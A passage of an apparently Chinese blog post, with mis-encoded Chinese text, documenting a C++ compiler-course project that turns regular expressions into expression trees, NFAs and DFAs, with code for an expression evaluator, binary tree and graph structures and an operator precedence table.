result*=factor;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(isDivide(op))&#123;</span><br><span class="line">            result/=factor;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> <span class="title function_">evalFactor</span><span class="params">()</span>&#123;<span class="comment">//åº•å±‚å·¥å…·äººå„¿</span></span><br><span class="line">    <span class="type">double</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">string</span> buffer;</span><br><span class="line">    <span class="type">bool</span> isNegetive=<span class="number">0</span>;<span class="comment">//è´Ÿæ•°æ ‡å¿—</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(expression[pos]==<span class="string">&#x27;-&#x27;</span>)&#123;<span class="comment">//é¦–å…ˆæ£€æŸ¥æ˜¯ä¸æ˜¯è´Ÿæ•°,</span></span><br><span class="line">        isNegetive=<span class="literal">true</span>;<span class="comment">//å‘½ä¸­è´Ÿå·,isNegetiveæ”¯èµ·æ¥</span></span><br><span class="line">        ++pos;<span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(isLeftBracket(expression[pos]))&#123;<span class="comment">//é­é‡æ‹¬å·,æ‹¬å·é‡Œé¢çš„è§†ä¸ºè¡¨è¾¾å¼æ‰”ç»™é¡¶å±‚</span></span><br><span class="line">        ++pos;</span><br><span class="line">        result=evalExpression();</span><br><span class="line">        <span class="keyword">if</span>(!isRightBracket(expression[pos]))&#123;<span class="comment">//é¡¶å±‚å¾ˆè‡ªè§‰,åªä¼šå¤„ç†åŠ å‡å¼å­,é‡åˆ°å³æ‹¬å·å°±ä¼šç”©é”…ç»™ä¸­å±‚,</span></span><br><span class="line">        <span class="comment">//ä¸­å±‚ä¹Ÿå¤„ç†ä¸äº†å³æ‹¬å·,ç”©é”…ç»™ä¸‹å±‚,è€Œä¸‹å±‚æ­£å¥½åœ¨è¿™é‡Œç­‰ç€å³æ‹¬å·å‘¢</span></span><br><span class="line">        <span class="comment">//å¦‚æœåº•å±‚å‘½ä¸­å³æ‹¬å·åˆ™æ²¡æœ‰é”™è¯¯,å¦åˆ™å°±è¯´æ˜ä»é¡¶å±‚åˆ°ä¸­å±‚åˆ°åº•å±‚ä¸‹æ¥çš„è¿™ä¸ªç¬¦å·æ˜¯ä¸ªå¤–æ˜Ÿäºº,ä¸ç†Ÿ,å‘ç”Ÿé”™è¯¯</span></span><br><span class="line">            Invalid=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++pos;<span class="comment">//åˆ°æ­¤è¯´æ˜å³æ‹¬å·å‘½ä¸­,pos++è¶Šè¿‡äº†å³æ‹¬å·</span></span><br><span class="line">        <span class="keyword">return</span> result;<span class="comment">//å¿…é¡»ç«‹åˆ»è¿”å›,å› ä¸ºåº•å±‚çš„ä»»åŠ¡å°±æ˜¯è®¡ç®—ä¸€ä¸ªå€¼,æ‹¬å·é‡Œçš„è¡¨è¾¾å¼çš„å€¼ç®—å®Œäº†å°±åº”è¯¥è¿”å›äº†</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ‰§è¡Œåˆ°æ­¤è¯´æ˜ä¸æ˜¯æ‹¬å·è¡¨è¾¾å¼,æ˜¯çº¯æ•°,çº¯æ•°åªéœ€è¦ä»å­—ç¬¦ä¸²æå–æˆæ•´æ•°ç„¶åä¸Šäº¤</span></span><br><span class="line">    <span class="keyword">while</span>(isDigit(expression[pos]))&#123;</span><br><span class="line">        buffer+=expression[pos];</span><br><span class="line">        ++pos;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    result=stod(buffer);</span><br><span class="line">    <span class="keyword">if</span>(isNegetive)&#123;<span class="comment">//ä¸€å¼€å§‹çš„æ—¶å€™æ¿€æ´»äº†è´Ÿæ•°æ ‡è®°,æ­¤æ—¶å°±åº”è¯¥ç»™resultä¸Šè´Ÿå·</span></span><br><span class="line">        result*=<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> text;</span><br><span class="line"><span class="type">double</span> result;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    text=<span class="string">&quot;1+2*3+(4+5)*6&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;calc(text)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="é¡¹ç›®ç»“æ„">é¡¹ç›®ç»“æ„</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Executor)-[/mnt/c/Users/86135/Desktop/parser/parser]</span><br><span class="line">â””â”€# tree</span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ ds</span><br><span class="line">â”‚   â”œâ”€â”€ Graph.cpp</span><br><span class="line">â”‚   â”œâ”€â”€ Graph.h</span><br><span class="line">â”‚   â”œâ”€â”€ Hash.cpp</span><br><span class="line">â”‚   â”œâ”€â”€ Hash.h</span><br><span class="line">â”‚   â”œâ”€â”€ Tree.cpp</span><br><span class="line">â”‚   â”œâ”€â”€ Tree.h</span><br><span class="line">â”‚   â”œâ”€â”€ Trie.cpp</span><br><span class="line">â”‚   â””â”€â”€ Trie.h</span><br><span class="line">â”œâ”€â”€ e2t</span><br><span class="line">â”‚   â”œâ”€â”€ e2t.cpp</span><br><span class="line">â”‚   â””â”€â”€ e2t.h</span><br><span class="line">â”œâ”€â”€ main</span><br><span class="line">â”œâ”€â”€ main.cpp</span><br><span class="line">â”œâ”€â”€ main.exe</span><br><span class="line">â”œâ”€â”€ make.bat</span><br><span class="line">â”œâ”€â”€ make.sh</span><br><span class="line">â”œâ”€â”€ n2d</span><br><span class="line">â”‚   â”œâ”€â”€ DFA.cpp</span><br><span class="line">â”‚   â”œâ”€â”€ DFA.H</span><br><span class="line">â”‚   â”œâ”€â”€ DFA.md</span><br><span class="line">â”‚   â”œâ”€â”€ epsilon.cpp</span><br><span class="line">â”‚   â”œâ”€â”€ n2d.cpp</span><br><span class="line">â”‚   â””â”€â”€ n2d.h</span><br><span class="line">â”œâ”€â”€ objects</span><br><span class="line">â”‚   â”œâ”€â”€ AC.o</span><br><span class="line">â”‚   â”œâ”€â”€ e2t.o</span><br><span class="line">â”‚   â”œâ”€â”€ Graph.o</span><br><span class="line">â”‚   â”œâ”€â”€ t2n.o</span><br><span class="line">â”‚   â”œâ”€â”€ Tree.o</span><br><span class="line">â”‚   â””â”€â”€ Trie.o</span><br><span class="line">â”œâ”€â”€ README.md</span><br><span class="line">â”œâ”€â”€ swj.cpp</span><br><span class="line">â””â”€â”€ t2n</span><br><span class="line">    â”œâ”€â”€ t2n.cpp</span><br><span class="line">    â””â”€â”€ t2n.h</span><br></pre></td></tr></table></figure>
<p>é‡‡ç”¨ç®¡é“è¿‡æ»¤å™¨æ¨¡å¼</p>
<p>dsåŒ…æ‹¬äºŒå‰æ ‘,å›¾ç­‰åŸºç¡€æ•°æ®ç»“æ„,ç”¨ä½œåŸºç±»</p>
<p>e2tæ¨¡å—æ„å»ºè¡¨è¾¾å¼æ ‘,è¯¥æ¨¡å—æ¥æ”¶ä¸€ä¸ªstringç±»å‹,è¾“å‡ºä¸€ä¸ªTreeç±»å‹</p>
<p>t2næ¨¡å—æ„å»ºNFA,è¯¥æ¨¡å—æ¥æ”¶ä¸€ä¸ªTreeç±»å‹,è¾“å‡ºä¸€ä¸ªNFAç±»å‹</p>
<p>n2dæ¨¡å—æ„å»ºDFA(æ­£åœ¨æ­¤å¤„),è¯¥æ¨¡å—æ¥æ”¶ä¸€ä¸ªNFA,è¾“å‡ºä¸€ä¸ªDFA</p>
<p>DFAæœ€å°åŒ–(æœªå®Œæˆ),è¯¥æ¨¡å—æ¥æ”¶ä¸€ä¸ªDFA,è¾“å‡ºä¸€ä¸ªæœ€å°åŒ–DFA</p>
<p>main.cppæ˜¯å…¥å£ç‚¹</p>
<p>make.shå’Œmake.batä¸ºç¼–è¯‘é“¾æ¥è„šæœ¬,ç›®å‰è¿˜ä¸ä¼šä½¿ç”¨makefile</p>
<h2 id="ds">ds</h2>
<h3 id="äºŒå‰æ ‘">äºŒå‰æ ‘</h3>
<h4 id="tree.h">Tree.h</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">// #include &lt;string&gt;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> op;</span><br><span class="line">    TreeNode *left, *right;</span><br><span class="line">    <span class="type">bool</span> <span class="title function_">isCharacter</span><span class="params">()</span>;</span><br><span class="line">    <span class="type">char</span> <span class="title function_">getOp</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">// TreeNode(char );</span></span><br><span class="line">    TreeNode(<span class="type">char</span> c = <span class="string">&#x27;\0&#x27;</span>, TreeNode *l = <span class="literal">NULL</span>, TreeNode *r = <span class="literal">NULL</span>) ;</span><br><span class="line">    <span class="comment">// TreeNode(char ,TreeNode *,TreeNode *);</span></span><br><span class="line">    friend <span class="built_in">std</span>::ostream &amp;operator&lt;&lt;(<span class="built_in">std</span>::ostream &amp;, <span class="type">const</span> TreeNode &amp;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Tree</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">    TreeNode *root;</span><br><span class="line">    <span class="type">void</span> <span class="title function_">inOrder</span><span class="params">(TreeNode *)</span>;</span><br><span class="line">    <span class="type">void</span> <span class="title function_">postOrder</span><span class="params">(TreeNode *)</span>;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    Tree(TreeNode *o=<span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">void</span> <span class="title function_">inOrder</span><span class="params">()</span>;</span><br><span class="line">    <span class="type">void</span> <span class="title function_">postOrder</span><span class="params">()</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="tree.cpp">Tree.cpp</h4>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Tree.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">TreeNode::<span class="built_in">TreeNode</span>(<span class="type">char</span> c, TreeNode *l, TreeNode *r) : <span class="built_in">op</span>(c), <span class="built_in">left</span>(l), <span class="built_in">right</span>(r) &#123;&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">TreeNode::isCharacter</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> left==<span class="literal">NULL</span>&amp;&amp;right==<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">char</span> <span class="title">TreeNode::getOp</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> op;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;os, <span class="type">const</span> TreeNode &amp;o)</span><br><span class="line">&#123;</span><br><span class="line">    os &lt;&lt; o.op;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Tree::inOrder</span><span class="params">(TreeNode *o)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">inOrder</span>(o-&gt;left);</span><br><span class="line">    cout &lt;&lt; (*o) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">inOrder</span>(o-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Tree::postOrder</span><span class="params">(TreeNode *o)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">postOrder</span>(o-&gt;left);</span><br><span class="line">    <span class="built_in">postOrder</span>(o-&gt;right);</span><br><span class="line">    cout &lt;&lt; (*o) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Tree::<span class="built_in">Tree</span>(TreeNode *o ) : <span class="built_in">root</span>(o) &#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Tree::inOrder</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">inOrder</span>(root);</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Tree::postOrder</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">postOrder</span>(root);</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æœ‰å‘å›¾">æœ‰å‘å›¾</h3>
<h4 id="graph.h">Graph.h</h4>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxn 100000</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">GraphEdge</span>&#123;</span><br><span class="line">    <span class="type">int</span> from;</span><br><span class="line">    <span class="type">int</span> to;</span><br><span class="line">    <span class="type">char</span> character;</span><br><span class="line">    <span class="built_in">GraphEdge</span>(<span class="type">int</span>,<span class="type">int</span>,<span class="type">char</span>);</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setValue</span><span class="params">(<span class="type">int</span>,<span class="type">int</span>,<span class="type">char</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getTo</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">friend</span> std::ostream &amp;<span class="keyword">operator</span>&lt;&lt;(std::ostream &amp;,<span class="type">const</span> GraphEdge&amp;);</span><br><span class="line">    <span class="function"><span class="type">char</span> <span class="title">getCharacter</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">GraphNode</span>&#123;</span><br><span class="line">    <span class="comment">// int id;</span></span><br><span class="line">    <span class="type">bool</span> isEnd;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; postEdges;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addEdge</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;)</span></span>;</span><br><span class="line">    <span class="built_in">GraphNode</span>();</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">end</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">friend</span> std::ostream &amp;<span class="keyword">operator</span>&lt;&lt;(std::ostream &amp;,<span class="type">const</span> GraphNode&amp;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Graph</span>&#123;</span><br><span class="line">    GraphEdge edges[maxn];</span><br><span class="line">    GraphNode nodes[maxn];</span><br><span class="line">    <span class="type">int</span> cnt_edges;</span><br><span class="line">    <span class="type">int</span> cnt_nodes;</span><br><span class="line">    <span class="comment">// std::vector&lt;GraphEdge&gt; edges;</span></span><br><span class="line">    <span class="comment">// std::vector&lt;GraphNode&gt; nodes;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> start;</span><br><span class="line">    <span class="type">int</span> finish;</span><br><span class="line">    <span class="built_in">Graph</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">newEdge</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;f,<span class="type">const</span> <span class="type">int</span> &amp;t,<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">newNode</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">info</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="graph.cpp">Graph.cpp</h4>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Graph.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">/// @brief GraphEdgeæ„é€ å‡½æ•°</span></span><br><span class="line"><span class="comment">/// @param f from,èµ·ç‚¹</span></span><br><span class="line"><span class="comment">/// @param t to,ç»ˆç‚¹</span></span><br><span class="line"><span class="comment">/// @param c character,æœ¬è¾¹ä¸Šçš„å­—ç¬¦</span></span><br><span class="line">GraphEdge::<span class="built_in">GraphEdge</span>(<span class="type">int</span> f=<span class="number">0</span>,<span class="type">int</span> t=<span class="number">0</span>,<span class="type">char</span> c=<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">    from=f;</span><br><span class="line">    to=t;</span><br><span class="line">    character=c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GraphEdge::setValue</span><span class="params">(<span class="type">int</span> f=<span class="number">0</span>,<span class="type">int</span> t=<span class="number">0</span>,<span class="type">char</span> c=<span class="string">&#x27;\0&#x27;</span>)</span></span>&#123;</span><br><span class="line">    from=f;</span><br><span class="line">    to=t;</span><br><span class="line">    character=c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GraphEdge::getTo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> to;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">char</span> <span class="title">GraphEdge::getCharacter</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> character;</span><br><span class="line">&#125;</span><br><span class="line">ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;os,<span class="type">const</span> GraphEdge &amp;edge)&#123;</span><br><span class="line">    <span class="keyword">if</span>(edge.character==<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        os&lt;&lt;edge.from&lt;&lt;<span class="string">&quot;----&gt;&quot;</span>&lt;&lt;edge.to;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        os&lt;&lt;edge.from&lt;&lt;<span class="string">&quot;--\&quot;&quot;</span>&lt;&lt;edge.character&lt;&lt;<span class="string">&quot;\&quot;--&gt;&quot;</span>&lt;&lt;edge.to;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GraphNode::<span class="built_in">GraphNode</span>()&#123; </span><br><span class="line">    isEnd=<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GraphNode::addEdge</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;e)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    postEdges.<span class="built_in">push_back</span>(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GraphNode::end</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> isEnd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;os,<span class="type">const</span> GraphNode &amp;node)&#123;<span class="comment">//stub</span></span><br><span class="line">    os&lt;&lt;<span class="string">&quot;node&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Graph::<span class="built_in">Graph</span>()&#123;</span><br><span class="line">    start=finish=<span class="number">0</span>;</span><br><span class="line">    cnt_edges=cnt_nodes=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Graph::newEdge</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;f,<span class="type">const</span> <span class="type">int</span> &amp;t,<span class="type">const</span> <span class="type">char</span> &amp;c)</span></span>&#123;</span><br><span class="line">    ++cnt_edges;</span><br><span class="line">    edges[cnt_edges].<span class="built_in">setValue</span>(f,t,c);</span><br><span class="line">    <span class="keyword">return</span> cnt_edges;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Graph::newNode</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ++cnt_nodes;</span><br><span class="line">    <span class="keyword">return</span> cnt_nodes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Graph::info</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=cnt_nodes;++i)&#123;</span><br><span class="line">        cout&lt;&lt;i&lt;&lt;<span class="string">&quot;((&quot;</span>&lt;&lt;i&lt;&lt;<span class="string">&quot;))&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=cnt_edges;++i)&#123;</span><br><span class="line">        cout&lt;&lt;edges[i]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="e2t">e2t</h2>
<p>expression to tree</p>
<p>ç»™å®šä¸€ä¸ªæ­£è§„å¼,æ„é€ å…¶è¡¨è¾¾å¼æ ‘</p>
<p>æ­£è§„å¼ä¸­åŒ…å«æ“ä½œæ•°éƒ½æ˜¯å•ä¸ªå­—æ¯,è¿ç®—ç¬¦æœ‰:</p>
<table>
<thead>
<tr>
<th>è¿ç®—ç¬¦</th>
<th>ç¬¦å·</th>
<th>ä¼˜å…ˆçº§</th>
</tr>
</thead>
<tbody>
<tr>
<td>æ‹¬å·</td>
<td><code>()</code></td>
<td>æœ€é«˜</td>
</tr>
<tr>
<td>é—­åŒ…</td>
<td><code>*</code></td>
<td>æ¬¡é«˜</td>
</tr>
<tr>
<td>è¿æ¥</td>
<td><code>.</code></td>
<td>æ¬¡ä½</td>
</tr>
<tr>
<td>æˆ–</td>
<td><code>|</code></td>
<td>æœ€ä½</td>
</tr>
</tbody>
</table>
<p>éƒ½æ˜¯å·¦ç»“åˆè¿ç®—,å…¶ä¸­</p>
<p>è¿æ¥,æˆ–,éƒ½æ˜¯äºŒå…ƒè¿ç®—ç¬¦</p>
<p>æ˜Ÿé—­åŒ…æ˜¯ä¸€å…ƒè¿ç®—ç¬¦,æ“ä½œæ•°åœ¨å·¦</p>
